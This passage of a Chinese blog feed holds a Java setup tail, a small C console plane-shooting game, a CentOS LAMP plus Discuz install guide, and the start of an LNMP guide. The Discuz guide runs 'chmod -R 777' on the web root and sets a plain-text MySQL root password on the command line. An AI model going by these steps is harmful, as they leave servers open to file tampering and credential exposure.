bash"><span class="hljs-built_in">source</span> ~/.bashrc<br></code></pre></td></tr></table></figure><p>使得环境变量配置生效</p><p>输入</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">java -<span class="hljs-built_in">version</span><br></code></pre></td></tr></table></figure><p>如果出现版本号说明安装配置成功</p><p>以上在联网的情况下可以通过</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> install openjdk-8-jdk<br></code></pre></td></tr></table></figure><p>完成</p>]]></content>
    
    
    
    <tags>
      
      <tag>运维</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一个不到300行的C语言消灭敌机游戏</title>
    <link href="/2017/06/post207/"/>
    <url>/2017/06/post207/</url>
    
    <content type="html"><![CDATA[<h3 id="一个不到300行的C语言消灭敌机游戏"><a href="#一个不到300行的C语言消灭敌机游戏" class="headerlink" title="一个不到300行的C语言消灭敌机游戏"></a>一个不到300行的C语言消灭敌机游戏</h3><span id="more"></span><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;conio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> Esc 27 <span class="hljs-comment">//退出</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> Up 72 <span class="hljs-comment">//上，下，左，右</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> Down 80</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> Left 75</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> Right 77</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> Kong 32 <span class="hljs-comment">//发射子弹</span></span><br><br><span class="hljs-type">int</span> x=<span class="hljs-number">10</span>; <span class="hljs-comment">//飞机坐标</span><br><span class="hljs-type">int</span> y=<span class="hljs-number">18</span>;<br><span class="hljs-type">int</span> d2=<span class="hljs-number">10</span>;<span class="hljs-comment">//敌机坐标</span><br><span class="hljs-type">int</span> d1=<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> d=<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> r=<span class="hljs-number">1</span>;<br><span class="hljs-type">int</span> r1=<span class="hljs-number">1</span>;<br><span class="hljs-type">int</span> r2=<span class="hljs-number">1</span>;<br><span class="hljs-type">int</span> t=<span class="hljs-number">1</span>; <span class="hljs-comment">// 游戏结束</span><br><span class="hljs-type">int</span> f=<span class="hljs-number">0</span>; <span class="hljs-comment">// 计分数</span><br><span class="hljs-type">int</span> m=<span class="hljs-number">3</span>; <span class="hljs-comment">// 敌机数</span><br><span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; <span class="hljs-comment">// 歼敌数</span><br><span class="hljs-type">char</span> p; <span class="hljs-comment">// 接受按键</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">kongzhi</span><span class="hljs-params">(<span class="hljs-type">int</span> bx,<span class="hljs-type">int</span> by)</span>;<span class="hljs-comment">//声明函数</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">huatu</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">gotoxy</span><span class="hljs-params">(<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> y)</span> <span class="hljs-comment">//移动坐标</span><br>&#123;<br>COORD coord;<br>coord.X=x;<br>coord.Y=y;<br>SetConsoleCursorPosition( GetStdHandle( STD_OUTPUT_HANDLE ), coord );<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">hidden</span><span class="hljs-params">()</span><span class="hljs-comment">//隐藏光标</span><br>&#123;<br>HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);<br>CONSOLE_CURSOR_INFO cci;<br>GetConsoleCursorInfo(hOut,&amp;cci);<br>cci.bVisible=<span class="hljs-number">0</span>;<span class="hljs-comment">//赋1为显示，赋0为隐藏</span><br>SetConsoleCursorInfo(hOut,&amp;cci);<br>&#125;<br><br><span class="hljs-comment">//说明</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">shuoming</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\t\t\t\n\n\n\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\t\t\t方向控制\n\n&quot;</span><br><span class="hljs-string">&quot;\t\t\t上 ↑\n\n&quot;</span><br><span class="hljs-string">&quot;\t\t\t下 ↓\n\n&quot;</span><br><span class="hljs-string">&quot;\t\t\t左 ←\n\n&quot;</span><br><span class="hljs-string">&quot;\t\t\t右 →\n\n&quot;</span><br><span class="hljs-string">&quot;\t\t\t子弹 空格\n\n\n&quot;</span><br><span class="hljs-string">&quot;\t\t\t退出请按 ESC\n&quot;</span>);<br>gotoxy(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">//判断我机死没死/游戏结束</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">byebye</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-keyword">if</span>((x==d&amp;&amp;y==r)||(x==d1&amp;&amp;y==r1)||(x==d2&amp;&amp;y==r2))<br>&#123;<br>gotoxy(<span class="hljs-number">1</span>,<span class="hljs-number">3</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; !!! 游戏结束 !!!\n&quot;</span><br><span class="hljs-string">&quot;*******************\n&quot;</span><br><span class="hljs-string">&quot; 您的总得分: %d\n\n&quot;</span><br><span class="hljs-string">&quot; 敌机数: %d\n&quot;</span><br><span class="hljs-string">&quot; 歼敌数: %d\n&quot;</span><br><span class="hljs-string">&quot; 命中率: %.0f %%\n&quot;</span><br><span class="hljs-string">&quot;*******************\n&quot;</span>,f,m,j,((<span class="hljs-type">float</span>)j/(<span class="hljs-type">float</span>)m)*<span class="hljs-number">100</span>);<br><span class="hljs-keyword">while</span>(!kbhit())<br>&#123;<br>Sleep(<span class="hljs-number">500</span>);<br>gotoxy(<span class="hljs-number">1</span>,<span class="hljs-number">12</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; 继续请按任意键...\n\n\n&quot;</span>);<br>Sleep(<span class="hljs-number">900</span>);<br>gotoxy(<span class="hljs-number">1</span>,<span class="hljs-number">12</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; &quot;</span>);<br>&#125;<br>gotoxy(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>huatu();<br>f=<span class="hljs-number">0</span>; m=<span class="hljs-number">0</span>; j=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span>(x&gt;=<span class="hljs-number">18</span>) x--;<br><span class="hljs-keyword">else</span> x++;<br>gotoxy(x,y);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Ж&quot;</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 计分/更新敌机</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">jifan</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-keyword">if</span>(x==d&amp;&amp;y==r)<br>&#123;<br>gotoxy(d,r);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;3&quot;</span>);<br>Sleep(<span class="hljs-number">200</span>);<br>gotoxy(d,r); <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; &quot;</span>); f+=<span class="hljs-number">2</span>; r=<span class="hljs-number">0</span>; j++;&#125;<br><span class="hljs-keyword">if</span>(x==d1&amp;&amp;y==r1)<br>&#123;<br>gotoxy(d1,r1);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1&quot;</span>);<br>Sleep(<span class="hljs-number">200</span>);<br>gotoxy(d1,r1);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; &quot;</span>);<br>f+=<span class="hljs-number">3</span>; r1=<span class="hljs-number">0</span>; j++;<br>&#125;<br><span class="hljs-keyword">if</span>(x==d2&amp;&amp;y==r2)<br>&#123;<br>gotoxy(d2,r2);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0&quot;</span>);<br>Sleep(<span class="hljs-number">200</span>);<br>gotoxy(d2,r2);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; &quot;</span>);<br>f+=<span class="hljs-number">1</span>; r2=<span class="hljs-number">0</span>; j++;<br>&#125;<br>gotoxy(<span class="hljs-number">26</span>,<span class="hljs-number">2</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %d \n&quot;</span>,f);<br><br>&#125;<br><br><span class="hljs-comment">//画图</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">huatu</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> i,n;<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">20</span>;i++)<br>&#123;<br><span class="hljs-keyword">for</span>(n=<span class="hljs-number">0</span>;n&lt;=<span class="hljs-number">20</span>;n++)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;*&quot;</span>);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;=<span class="hljs-number">19</span>;i++)<br>&#123;<br><span class="hljs-keyword">for</span>(n=<span class="hljs-number">1</span>;n&lt;=<span class="hljs-number">19</span>;n++)<br>&#123;<br>gotoxy(i,n);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; &quot;</span>);<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//随机产生敌机</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">dfeiji</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-keyword">while</span>(t)<br>&#123;<br><span class="hljs-keyword">if</span>(!r) &#123;d=rand()%<span class="hljs-number">17</span>+<span class="hljs-number">1</span>; m++;&#125;<br><span class="hljs-keyword">if</span>(!r1) &#123;d1=rand()%<span class="hljs-number">17</span>+<span class="hljs-number">1</span>; m++;&#125;<br><span class="hljs-keyword">if</span>(!r2) &#123;d2=rand()%<span class="hljs-number">17</span>+<span class="hljs-number">1</span>; m++;&#125;<br><span class="hljs-keyword">while</span>(t)<br>&#123;<br>r++; r1++; r2++;<br>gotoxy(d,r);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Ψ&quot;</span>);<br>gotoxy(d1,r1);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ж&quot;</span>);<br>gotoxy(d2,r2);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;♀&quot;</span>);<br>Sleep(<span class="hljs-number">900</span>);<br>gotoxy(d,r);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; &quot;</span>);<br>gotoxy(d1,r1);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; &quot;</span>);<br>gotoxy(d2,r2);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; &quot;</span>);<br>kongzhi(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>byebye();<br><span class="hljs-keyword">if</span>(r==<span class="hljs-number">18</span>) r=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span>(r1==<span class="hljs-number">18</span>) r1=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span>(r2==<span class="hljs-number">18</span>) r2=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span>(r==<span class="hljs-number">0</span>||r1==<span class="hljs-number">0</span>||r2==<span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//操控飞机</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">kongzhi</span><span class="hljs-params">(<span class="hljs-type">int</span> bx,<span class="hljs-type">int</span> by)</span><br>&#123;<br><span class="hljs-type">int</span> a;<br><span class="hljs-keyword">while</span> (kbhit())<br>&#123;<br><span class="hljs-keyword">if</span>((p=getch())==<span class="hljs-number">-32</span>) p=getch();<br>a=p;<br>gotoxy(<span class="hljs-number">22</span>,<span class="hljs-number">5</span>);<br><span class="hljs-keyword">switch</span>(a)<br>&#123;<span class="hljs-comment">//控制方向</span><br><span class="hljs-keyword">case</span> Up:<span class="hljs-keyword">if</span> (y!=<span class="hljs-number">1</span>)<br>&#123;<br>gotoxy(x,y);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; &quot;</span>);<br>y--;<br>gotoxy(x,y);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Ж&quot;</span>);<br>&#125;<span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> Down:<span class="hljs-keyword">if</span> (y!=<span class="hljs-number">18</span>)<br>&#123;<br>gotoxy(x,y);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; &quot;</span>);<br>y++;<br>gotoxy(x,y);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Ж&quot;</span>);<br>&#125;<span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> Left:<span class="hljs-keyword">if</span> (x!=<span class="hljs-number">1</span>)<br>&#123;<br>gotoxy(x,y);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; &quot;</span>);<br>x--;<br>gotoxy(x,y);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Ж&quot;</span>);<br>&#125;<span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> Right:<span class="hljs-keyword">if</span> (x!=<span class="hljs-number">18</span>)<br>&#123;<br>gotoxy(x,y);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; &quot;</span>);<br>x++;<br>gotoxy(x,y);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Ж&quot;</span>);<br>&#125;<span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> Kong:<br>&#123;<br>bx=y;<br><span class="hljs-keyword">for</span>(by=y;by&gt;<span class="hljs-number">1</span>;) <span class="hljs-comment">//发射子弹</span><br>&#123;<br>by--;<br>gotoxy(x,by);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;θ&quot;</span>);<br>Sleep(<span class="hljs-number">10</span>);<br>gotoxy(x,by);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; &quot;</span>);<br>y=by;<br>jifan();<br><span class="hljs-keyword">if</span>(r==<span class="hljs-number">0</span>||r1==<span class="hljs-number">0</span>||r2==<span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;<br>&#125;<br>y=bx;<br>&#125;<span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> Esc:t=<span class="hljs-number">0</span>; <span class="hljs-keyword">break</span>; <span class="hljs-comment">//退出</span><br><span class="hljs-keyword">default</span>:<span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>srand(time(<span class="hljs-literal">NULL</span>));<br>shuoming();<br>hidden();<br>huatu();<br>gotoxy(x,y);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Ж&quot;</span>);<br>gotoxy(<span class="hljs-number">22</span>,<span class="hljs-number">2</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;分数:&quot;</span>);<br><span class="hljs-keyword">while</span> (t)<br>&#123;<br>kongzhi(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(t)<br>dfeiji ();<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>C</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>搭建L(Linux)+A(Apache)+M(MySQL)+P(PHP)网站环境，并安装Discuz</title>
    <link href="/2017/06/post199/"/>
    <url>/2017/06/post199/</url>
    
    <content type="html"><![CDATA[<h3 id="搭建LAMP环境：以下基于腾讯云镜像CentOS-6-8-64bit，本方法不适用于其他镜像"><a href="#搭建LAMP环境：以下基于腾讯云镜像CentOS-6-8-64bit，本方法不适用于其他镜像" class="headerlink" title="搭建LAMP环境：以下基于腾讯云镜像CentOS 6.8 64bit，本方法不适用于其他镜像"></a>搭建LAMP环境：以下基于腾讯云镜像CentOS 6.8 64bit，本方法不适用于其他镜像</h3><h3 id="一、安装MySQL"><a href="#一、安装MySQL" class="headerlink" title="一、安装MySQL"></a>一、安装MySQL</h3><h4 id="1-使用-yum-安装-MySQL："><a href="#1-使用-yum-安装-MySQL：" class="headerlink" title="1.使用 yum 安装 MySQL："></a>1.使用 yum 安装 MySQL：</h4><pre><code class="hljs">yum install mysql-server -y</code></pre><h4 id="2-安装完成后，启动-MySQL-服务："><a href="#2-安装完成后，启动-MySQL-服务：" class="headerlink" title="2.安装完成后，启动 MySQL 服务："></a>2.安装完成后，启动 MySQL 服务：</h4><pre><code class="hljs">service mysqld restart</code></pre><span id="more"></span><h4 id="3-配置账号密码"><a href="#3-配置账号密码" class="headerlink" title="3.配置账号密码"></a>3.配置账号密码</h4><pre><code class="hljs">/usr/bin/mysqladmin -u root password &#39;9MiOskMW&#39;</code></pre><h4 id="4-将-MySQL-设置为开机自动启动："><a href="#4-将-MySQL-设置为开机自动启动：" class="headerlink" title="4.将 MySQL 设置为开机自动启动："></a>4.将 MySQL 设置为开机自动启动：</h4><pre><code class="hljs">chkconfig mysqld on</code></pre><h3 id="二、安装Apache"><a href="#二、安装Apache" class="headerlink" title="二、安装Apache"></a>二、安装Apache</h3><h4 id="1-使用-yum-安装-Apache-组件："><a href="#1-使用-yum-安装-Apache-组件：" class="headerlink" title="1.使用 yum 安装 Apache 组件："></a>1.使用 yum 安装 Apache 组件：</h4><pre><code class="hljs">yum install httpd -y</code></pre><h4 id="2-安装之后，启动-httpd-进程："><a href="#2-安装之后，启动-httpd-进程：" class="headerlink" title="2.安装之后，启动 httpd 进程："></a>2.安装之后，启动 httpd 进程：</h4><pre><code class="hljs">service httpd start</code></pre><h4 id="3-把-httpd-也设置成开机自动启动："><a href="#3-把-httpd-也设置成开机自动启动：" class="headerlink" title="3.把 httpd 也设置成开机自动启动："></a>3.把 httpd 也设置成开机自动启动：</h4><pre><code class="hljs">chkconfig httpd on</code></pre><h3 id="三、安装PHP"><a href="#三、安装PHP" class="headerlink" title="三、安装PHP"></a>三、安装PHP</h3><h4 id="1-使用-yum-安装-PHP："><a href="#1-使用-yum-安装-PHP：" class="headerlink" title="1.使用 yum 安装 PHP："></a>1.使用 yum 安装 PHP：</h4><pre><code class="hljs">yum install php php-fpm php-mysql -y</code></pre><h4 id="2-安装之后，启动-PHP-FPM-进程："><a href="#2-安装之后，启动-PHP-FPM-进程：" class="headerlink" title="2.安装之后，启动 PHP-FPM 进程："></a>2.安装之后，启动 PHP-FPM 进程：</h4><pre><code class="hljs">service php-fpm start</code></pre><h4 id="3-启动之后，可以使用下面的命令查看-PHP-FPM-进程监听哪个端口"><a href="#3-启动之后，可以使用下面的命令查看-PHP-FPM-进程监听哪个端口" class="headerlink" title="3.启动之后，可以使用下面的命令查看 PHP-FPM 进程监听哪个端口"></a>3.启动之后，可以使用下面的命令查看 PHP-FPM 进程监听哪个端口</h4><pre><code class="hljs">netstat -nlpt | grep php-fpm</code></pre><h4 id="4-把-PHP-FPM-也设置成开机自动启动："><a href="#4-把-PHP-FPM-也设置成开机自动启动：" class="headerlink" title="4.把 PHP-FPM 也设置成开机自动启动："></a>4.把 PHP-FPM 也设置成开机自动启动：</h4><pre><code class="hljs">chkconfig php-fpm on</code></pre><h3 id="安装Discuz"><a href="#安装Discuz" class="headerlink" title="安装Discuz"></a>安装Discuz</h3><h4 id="1-CentOS-6-没有Discuz-的-yum-源，所以我们需要下载一个Discuz-压缩包："><a href="#1-CentOS-6-没有Discuz-的-yum-源，所以我们需要下载一个Discuz-压缩包：" class="headerlink" title="1.CentOS 6 没有Discuz 的 yum 源，所以我们需要下载一个Discuz 压缩包："></a>1.CentOS 6 没有Discuz 的 yum 源，所以我们需要下载一个Discuz 压缩包：</h4><pre><code class="hljs">wget http://download.comsenz.com/DiscuzX/3.2/Discuz_X3.2_SC_UTF8.zip</code></pre><h4 id="2-下载完成后，解压这个压缩包"><a href="#2-下载完成后，解压这个压缩包" class="headerlink" title="2.下载完成后，解压这个压缩包"></a>2.下载完成后，解压这个压缩包</h4><pre><code class="hljs">unzip Discuz_X3.2_SC_UTF8.zip</code></pre><h4 id="3-由于PHP默认访问-var-www-html-文件夹，所以我们需要把upload文件夹里的文件都复制到-var-www-html-文件夹"><a href="#3-由于PHP默认访问-var-www-html-文件夹，所以我们需要把upload文件夹里的文件都复制到-var-www-html-文件夹" class="headerlink" title="3.由于PHP默认访问 /var/www/html/ 文件夹，所以我们需要把upload文件夹里的文件都复制到 /var/www/html/ 文件夹"></a>3.由于PHP默认访问 /var/www/html/ 文件夹，所以我们需要把upload文件夹里的文件都复制到 /var/www/html/ 文件夹</h4><pre><code class="hljs">cp -r upload/* /var/www/html/</code></pre><h4 id="4-给-var-www-html-目录及其子目录赋予权限"><a href="#4-给-var-www-html-目录及其子目录赋予权限" class="headerlink" title="4.给 /var/www/html 目录及其子目录赋予权限"></a>4.给 /var/www/html 目录及其子目录赋予权限</h4><pre><code class="hljs">chmod -R 777 /var/www/html</code></pre><h4 id="4-重启-Apache"><a href="#4-重启-Apache" class="headerlink" title="4.重启 Apache"></a>4.重启 Apache</h4><pre><code class="hljs">service httpd restart</code></pre><h3 id="至此大功告成，通过浏览器访问服务器IP地址即可打开Discuz安装页面"><a href="#至此大功告成，通过浏览器访问服务器IP地址即可打开Discuz安装页面" class="headerlink" title="至此大功告成，通过浏览器访问服务器IP地址即可打开Discuz安装页面"></a>至此大功告成，通过浏览器访问服务器IP地址即可打开Discuz安装页面</h3>]]></content>
    
    
    
    <tags>
      
      <tag>运维</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>搭建L(Linux)+N(Nginx)+M(MySQL)+P(PHP)网站环境，并安装Wordpress</title>
    <link href="/2017/06/post192/"/>
    <url>/2017/06/post192/</url>
    
    <content type="html"><![CDATA[<h3 id="搭建LNMP环境：以下基于腾讯云镜像CentOS-6-8-64bit，或不适用于其他镜像"><a href="#搭建LNMP环境：以下基于腾讯云镜像CentOS-6-8-64bit，或不适用于其他镜像" class="headerlink" title="搭建LNMP环境：以下基于腾讯云镜像CentOS 6.8 64bit，或不适用于其他镜像"></a>搭建LNMP环境：以下基于腾讯云镜像CentOS 6.8 64bit，或不适用于其他镜像</h3><h3 id="一、安装Nginx"><a href="#一、安装Nginx" class="headerlink" title="一、安装Nginx"></a>一、安装Nginx</h3><h4 id="1-使用-yum-安装-Nginx："><a href="#1-使用-yum-安装-Nginx：" class="headerlink" title="1.使用 yum 安装 Nginx："></a>1.使用 yum 安装 Nginx：</h4><p>yum install nginx -y</p><h4 id="2-修改-etc-nginx-conf-d-default-conf"><a href="#2-修改-etc-nginx-conf-d-default-conf" class="headerlink" title="2.修改/etc/nginx/conf.d/default.conf"></a>2.修改/etc/nginx/conf.d/default.conf</h4><p>去除对 IPv6 地址的监听，可参考下面的示例</p><span id="more"></span><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 